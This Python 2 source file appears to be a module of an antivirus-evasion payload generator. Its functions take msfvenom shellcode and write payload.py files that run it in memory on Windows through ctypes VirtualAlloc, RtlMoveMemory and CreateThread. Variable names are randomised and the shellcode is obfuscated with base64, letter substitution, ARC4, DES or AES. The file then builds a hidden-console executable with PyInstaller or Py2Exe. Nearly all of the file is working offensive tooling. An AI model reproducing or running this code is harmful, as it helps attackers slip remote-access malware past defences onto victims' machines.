# Import Modules
import base64
import os
import string
import random
from Crypto.Cipher import AES
from Crypto.Cipher import DES
from Crypto.Cipher import ARC4
from modules.auxiliary import aes
from modules.auxiliary import shellcode
from modules.common import randomizer
from modules.common import messages

def voidpointer():
    # Generate Shellcode Using msfvenom
    Shellcode = shellcode.genShellcode()

    # Generate Random Variable Names
    RandShellcode = randomizer.randomString()
    RandReverseShell = randomizer.randomString()
    RandMemoryShell = randomizer.randomString()

    # Create Payload File
    PayloadFile = open('payload.py', 'w')
    PayloadFile.write('#!/usr/bin/python\n\n')
    PayloadFile.write('from ctypes import *\n\n')
    PayloadFile.write(RandReverseShell + ' = \"' + Shellcode + '\"\n')
    PayloadFile.write(RandMemoryShell + ' = create_string_buffer(' + RandReverseShell + ', len(' + RandReverseShell + '))\n')
    PayloadFile.write(RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n')
    PayloadFile.write(RandShellcode + '()')
    PayloadFile.close()

    # Create Supporting Files and Print Exit Message
    supportingFiles()
    messages.endmsg()

def VirtualAlloc():
    # Generate Shellcode Using msfvenom
    Shellcode = shellcode.genShellcode()
    
    # Generate Random Variable Names
    ShellcodeVariableName = randomizer.randomString()
    RandPtr = randomizer.randomString()
    RandBuf = randomizer.randomString()
    RandHt = randomizer.randomString()

    # Create Payload File
    PayloadFile = open('payload.py', 'w')
    PayloadFile.write('#!/usr/bin/python\n\n')
    PayloadFile.write('import ctypes\n\n')
    PayloadFile.write(ShellcodeVariableName +' = bytearray(\'' + Shellcode + '\')\n\n')
    PayloadFile.write(RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ ShellcodeVariableName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n\n')
    PayloadFile.write(RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n\n')
    PayloadFile.write('ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n\n')
    PayloadFile.write(RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n\n')
    PayloadFile.write('ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))')
    PayloadFile.close()

    # Create Supporting Files and Print Exit Message
    supportingFiles()
    messages.endmsg()

def b64VAlloc():
    # Generate Shellcode Using msfvenom
    Shellcode = shellcode.genShellcode()    

    # Base64 Encode Shellcode
    EncodedShellcode = base64.b64encode(Shellcode)    

    # Generate Random Variable Names
    ShellcodeVariableName = randomizer.randomString()
    RandPtr = randomizer.randomString()
    RandBuf = randomizer.randomString()
    RandHt = randomizer.randomString()
    RandT = randomizer.randomString()

    # Create Payload File
    PayloadFile = open('payload.py', 'w')
    PayloadFile.write('#!/usr/bin/python\n\n')
    PayloadFile.write('import ctypes\n')
    PayloadFile.write('import base64\n\n')
    PayloadFile.write(RandT + " = \"" + EncodedShellcode + "\"\n")
    PayloadFile.write(ShellcodeVariableName + " = bytearray(" + RandT + ".decode('base64','strict').decode(\"string_escape\"))\n")
    PayloadFile.write(RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + ShellcodeVariableName + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n\n')
    PayloadFile.write(RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName  + ')).from_buffer(' + ShellcodeVariableName + ')\n\n')
    PayloadFile.write('ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n\n')
    PayloadFile.write(RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n\n')
    PayloadFile.write('ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))')
    PayloadFile.close()

    # Create Supporting Files and Print Exit Message
    supportingFiles()
    messages.endmsg()

def LetterSubVAlloc():
    # Generate Shellcode Using msfvenom
    Shellcode = shellcode.genShellcode()

    # Generate Random Variable Names
    SubbedShellcodeVariableName = randomizer.randomString()
    ShellcodeVariableName = randomizer.randomString()
    RandPtr = randomizer.randomString()
    RandBuf = randomizer.randomString()
    RandHt = randomizer.randomString()
    RandDecodedLetter = randomizer.randomString()
    RandCorrectLetter = randomizer.randomString()
    RandSubScheme = randomizer.randomString()

    # Letter Substitution Variables
    EncodeWithThis = "c"
    DecodeWithThis = "t"

    # Create Letter Substitution Scheme
    SubScheme = string.maketrans(EncodeWithThis, DecodeWithThis)

    # Escaping Shellcode
    Shellcode = Shellcode.encode("string_escape")

    # Create Payload File
    PayloadFile = open('payload.py', 'w')
    PayloadFile.write('#!/usr/bin/python\n\n')
    PayloadFile.write('import ctypes\n')
    PayloadFile.write('from string import maketrans\n\n')
    PayloadFile.write(RandDecodedLetter + ' = "t"\n')
    PayloadFile.write(RandCorrectLetter + ' = "c"\n\n')
    PayloadFile.write(RandSubScheme + ' = maketrans('+ RandDecodedLetter +', '+ RandCorrectLetter + ')\n\n')
    PayloadFile.write(SubbedShellcodeVariableName + ' = \"'+ Shellcode.translate(SubScheme) +'\"\n\n')
    PayloadFile.write(SubbedShellcodeVariableName + ' = ' + SubbedShellcodeVariableName + '.translate(' + RandSubScheme + ')\n')
    PayloadFile.write(ShellcodeVariableName + ' = bytearray(' + SubbedShellcodeVariableName + '.decode(\"string_escape\"))\n\n')
    PayloadFile.write(RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + ShellcodeVariableName + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n\n')
    PayloadFile.write(RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n\n')
    PayloadFile.write('ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n\n')
    PayloadFile.write(RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n\n')
    PayloadFile.write('ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))')
    PayloadFile.close()

    # Create Supporting Files and Print Exit Message
    supportingFiles()
    messages.endmsg()

def ARCVAlloc():
    # Generate Shellcode Using msfvenom
    Shellcode = shellcode.genShellcode()

    # Generate Random Variable Names
    RandPtr = randomizer.randomString()
    RandBuf = randomizer.randomString()
    RandHt = randomizer.randomString()
    ShellcodeVariableName = randomizer.randomString()
    RandIV = randomizer.randomString()
    RandARCKey = randomizer.randomString()
    RandARCPayload = randomizer.randomString()
    RandEncShellCodePayload = randomizer.randomString()

    # Set IV Value and DES Key
    iv = ''.join(random.choice(string.ascii_letters) for x in range(8))
    ARCKey = ''.join(random.choice(string.ascii_letters + string.digits) for x in range(8))

    # Create DES Object and encrypt our payload
    arc4main = ARC4.new(ARCKey)
    EncShellCode = arc4main.encrypt(Shellcode)

    # Create Payload File
    PayloadFile = open('payload.py', 'w')
    PayloadFile.write('#!/usr/bin/python\n\n')
    PayloadFile.write('from Crypto.Cipher import ARC4\n')
    PayloadFile.write('import ctypes\n\n')
    PayloadFile.write(RandIV + ' = \'' + iv + '\'\n')
    PayloadFile.write(RandARCKey + ' = \'' + ARCKey + '\'\n')
    PayloadFile.write(RandARCPayload + ' = ARC4.new(' + RandARCKey + ')\n\n')
    PayloadFile.write(RandEncShellCodePayload + ' = \'' + EncShellCode.encode("string_escape") + '\'\n\n')
    PayloadFile.write(ShellcodeVariableName + ' = bytearray(' + RandARCPayload + '.decrypt(' + RandEncShellCodePayload + ').decode(\'string_escape\'))\n')
    PayloadFile.write(RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ ShellcodeVariableName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n\n')
    PayloadFile.write(RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n\n')
    PayloadFile.write('ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n\n')
    PayloadFile.write(RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n\n')
    PayloadFile.write('ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))')
    PayloadFile.close()

    # Create Supporting Files and Print Exit Message
    supportingFiles()
    messages.endmsg()

def DESVAlloc():
    # Generate Shellcode Using msfvenom
    Shellcode = shellcode.genShellcode()

    # Generate Random Variable Names
    RandPtr = randomizer.randomString()
    RandBuf = randomizer.randomString()
    RandHt = randomizer.randomString()
    ShellcodeVariableName = randomizer.randomString()
    RandIV = randomizer.randomString()
    RandDESKey = randomizer.randomString()
    RandDESPayload = randomizer.randomString()
    RandEncShellCodePayload = randomizer.randomString()

    # Set IV Value and DES Key
    iv = ''.join(random.choice(string.ascii_letters) for x in range(8))
    DESKey = ''.join(random.choice(string.ascii_letters + string.digits) for x in range(8))

    # Create DES Object and encrypt our payload
    desmain = DES.new(DESKey, DES.MODE_CFB, iv)
    EncShellCode = desmain.encrypt(Shellcode)

    # Create Payload File
    PayloadFile = open('payload.py', 'w')
    PayloadFile.write('#!/usr/bin/python\n\n')
    PayloadFile.write('from Crypto.Cipher import DES\n')
    PayloadFile.write('import ctypes\n\n')
    PayloadFile.write(RandIV + ' = \'' + iv + '\'\n')
    PayloadFile.write(RandDESKey + ' = \'' + DESKey + '\'\n')
    PayloadFile.write(RandDESPayload + ' = DES.new(' + RandDESKey + ', DES.MODE_CFB, ' + RandIV + ')\n\n')
    PayloadFile.write(RandEncShellCodePayload + ' = \'' + EncShellCode.encode("string_escape") + '\'\n\n')
    PayloadFile.write(ShellcodeVariableName + ' = bytearray(' + RandDESPayload + '.decrypt(' + RandEncShellCodePayload + ').decode(\'string_escape\'))\n')
    PayloadFile.write(RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ ShellcodeVariableName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n\n')
    PayloadFile.write(RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n\n')
    PayloadFile.write('ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n\n')
    PayloadFile.write(RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n\n')
    PayloadFile.write('ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))')
    PayloadFile.close()

    # Create Supporting Files and Print Exit Message
    supportingFiles()
    messages.endmsg()

def AESVAlloc():
    # Generate Shellcode Using msfvenom
    Shellcode = shellcode.genShellcode()

    # Generate Random Variable Names
    ShellcodeVariableName = randomizer.randomString()
    RandPtr = randomizer.randomString()
    RandBuf = randomizer.randomString()
    RandHt = randomizer.randomString()
    RandDecodeAES = randomizer.randomString()
    RandCipherObject = randomizer.randomString()
    RandDecodedShellcode = randomizer.randomString()
    RandShellCode = randomizer.randomString()
    RandPadding = randomizer.randomString()

    # Set AES Block Size and Padding
    BlockSize = 32
    Padding = '{'

    # Function for Padding Encrypted Text to Fit the Block
    pad = lambda s: s + (BlockSize - len(s) % BlockSize) * Padding

    # Encrypt & Encode or Decrypt & Decode a String
    EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
    DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(Padding)

    # Generate Random AES Key
    secret = aes.aesKey()

    # Create Cipher Object with Generated Secret Key
    cipher = AES.new(secret)

    # Encrypt the String
    EncodedShellcode = EncodeAES(cipher, Shellcode)

    # Create Payload File
    PayloadFile = open('payload.py', 'w')
    PayloadFile.write('#!/usr/bin/python\n\n')
    PayloadFile.write('import ctypes\n')
    PayloadFile.write('from Crypto.Cipher import AES\n')
    PayloadFile.write('import base64\n')
    PayloadFile.write('import os\n\n')
    PayloadFile.write(RandPadding + ' = \'{\'\n') 
    PayloadFile.write(RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n')
    PayloadFile.write(RandCipherObject + ' = AES.new(\'' + secret + '\')\n')
    PayloadFile.write(RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n')
    PayloadFile.write(RandShellCode + ' = bytearray(' + RandDecodedShellcode + '.decode("string_escape"))\n\n')
    PayloadFile.write(RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + RandShellCode + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n\n')
    PayloadFile.write(RandBuf + ' = (ctypes.c_char * len(' + RandShellCode + ')).from_buffer(' + RandShellCode + ')\n\n')
    PayloadFile.write('ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + RandShellCode + ')))\n\n')
    PayloadFile.write(RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n\n')
    PayloadFile.write('ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))')    
    PayloadFile.close()

    # Create Supporting Files and Print Exit Message
    supportingFiles()
    messages.endmsg()

# Generating Supporting Files Function
def supportingFiles():

    # Print Title
    messages.title()

    # Determine if the user wants Pyinstaller or Py2Exe.
    print '\n[?] How would you like to create your payload executable?\n'
    print ' 1 - Pyinstaller (default)'
    print ' 2 - Py2Exe\n'
    PyMaker = raw_input("[>] Please enter the number of your choice: ")

    # Python-Wrapper If-statement
    if PyMaker == "2":
        # Generate setup.py File for Py2Exe
        SetupFile = open('setup.py', 'w')
        SetupFile.write("from distutils.core import setup\n")
        SetupFile.write("import py2exe, sys, os\n\n")
        SetupFile.write("setup(\n")
        SetupFile.write("\toptions = {'py2exe': {'bundle_files': 1}},\n")
        SetupFile.write("\tzipfile = None,\n")
        SetupFile.write("\twindows=['payload.py']\n")
        SetupFile.write(")")
        SetupFile.close()

        # Generate Batch script for Compiling on Windows Using Py2Exe
        RunmeFile = open('runme.bat', 'w')
        RunmeFile.write('rem Batch Script for compiling python code into an executable\n')
        RunmeFile.write('rem on windows with py2exe\n')
        RunmeFile.write('rem Developed by @ChrisTruncer\n\n')
        RunmeFile.write('rem Usage: Drop into your Python folder and click, or anywhere if Python is in your system path\n\n')
        RunmeFile.write("python setup.py py2exe\n")
        RunmeFile.write('cd dist\n')
        RunmeFile.write('move payload.exe ../\n')
        RunmeFile.write('cd ..\n')
        RunmeFile.write('rmdir /S /Q build\n')
        RunmeFile.write('rmdir /S /Q dist\n')
        RunmeFile.close()
        print shellcode.helpfulinfo    

     # Else, Use Pyinstaller (used by default)
    else:
        # Check for Wine python.exe Binary (Thanks to darknight007 for this fix.)
        if(os.path.isfile('/root/.wine/drive_c/Python27/python.exe')):
            print
            os.system('wine /root/.wine/drive_c/Python27/python.exe /root/pyinstaller-2.0/pyinstaller.py --noconsole --onefile payload.py')
            os.system('mv dist/payload.exe .')
            os.system('rm -rf dist')
            os.system('rm -rf build')
            os.system('rm payload.spec')
            os.system('rm logdict*.*')
            os.system('rm payload.py')
            messages.title()
            print shellcode.helpfulinfo
        else:
            messages.title()
            print "\n[Error]: Can't find python.exe in /root/.wine/drive_c/Python27/."
            print "         Make sure the python.exe binary exists before using PyInstaller.\n"
            exit(1)
